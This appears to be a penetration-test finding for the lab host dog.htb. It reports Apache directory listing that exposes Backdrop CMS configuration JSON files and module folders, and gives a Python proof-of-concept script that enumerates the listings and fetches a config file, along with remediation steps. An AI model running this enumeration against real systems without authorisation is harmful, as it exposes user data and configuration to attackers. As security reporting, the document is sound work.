# Directory Listing Exposes Sensitive Configuration Files

**ID:** vuln-0003
**Severity:** MEDIUM
**Found:** 2026-02-22 19:48:16 UTC
**Target:** http://dog.htb
**Endpoint:** /files/
**Method:** GET
**CWE:** CWE-548
**CVSS:** 5.3

## Description

The web server has directory listing enabled for multiple sensitive directories including /files/ and /modules/. This allows unauthorized enumeration of files and directories, exposing configuration files, user data, and potentially uploaded content.

## Impact

Directory listing enables attackers to discover and access sensitive files that may not be directly linked from the application. The /files/ directory contains:
- Configuration JSON files with user emails, role definitions, and system settings
- Potentially uploaded user content
- Configuration storage directories with hashed paths

This information aids attackers in understanding the application structure, identifying high-value targets, and planning further attacks.

## Technical Analysis

Apache web server is configured with directory listing (Options +Indexes) enabled for the /files/ and /modules/ directories. When accessing http://dog.htb/files/, the server returns an HTML directory listing showing:

- config_83dddd18e1ec67fd8ff5bba2453c7fb3/ - Active configuration directory
- css/ - Compiled CSS files
- js/ - JavaScript files
- styles/ - Image styles

Within the configuration directory, JSON files are exposed containing:
- user.role.administrator.json - Admin role permissions
- user.role.editor.json - Editor role permissions
- system.core.json - System configuration including password policies
- user.mail.json - Email templates with password reset URLs

The /modules/ directory listing also exposes installed modules which could reveal vulnerable components.

## Proof of Concept

1. Navigate to http://dog.htb/files/
2. Observe directory listing with multiple exposed directories
3. Click into config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/
4. Access configuration JSON files directly
5. Navigate to http://dog.htb/modules/ for module enumeration

```
import requests
import re

TARGET = "http://dog.htb"

# Check directory listing
directories = ["/files/", "/modules/"]

for directory in directories:
    response = requests.get(f"{TARGET}{directory}")
    
    if "Index of" in response.text or "<title>Index of" in response.text:
        print(f"[+] Directory listing enabled: {directory}")
        
        # Extract file/folder names
        links = re.findall(r'href="([^"]+)"', response.text)
        print(f"    Contents: {links[:10]}")
        
        # Check for sensitive files
        if "config" in response.text:
            print(f"    [!] Configuration directory exposed")
    else:
        print(f"[-] No directory listing: {directory}")

# Try to access config files
config_path = "/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/"
config_response = requests.get(f"{TARGET}{config_path}")

if config_response.status_code == 200:
    print(f"[+] Configuration directory accessible")
    # List exposed config files
    config_files = re.findall(r'href="([^"]+\.json)"', config_response.text)
    print(f"    Exposed config files: {len(config_files)}")
    
    # Check one file
    if config_files:
        sample = requests.get(f"{TARGET}{config_path}{config_files[0]}")
        print(f"    Sample file accessible: {sample.status_code == 200}")
```

## Remediation

1. Disable directory listing in Apache configuration:
   - Remove "Indexes" from Options directive
   - Add "Options -Indexes" to disable explicitly

2. Add .htaccess files to prevent directory listing:
   - Create .htaccess in sensitive directories with "Options -Indexes"

3. Move configuration storage outside the web root:
   - Configure $config_directories['active'] to use a path outside public access
   - Example: $config_directories['active'] = '../config/active';

4. Implement access controls for sensitive directories:
   - Use Apache mod_rewrite or similar to block direct access to configuration files

5. Add proper .htaccess rules in the files directory (Backdrop CMS provides these by default, verify they are in place)

6. Regularly audit web server configuration for exposed directories
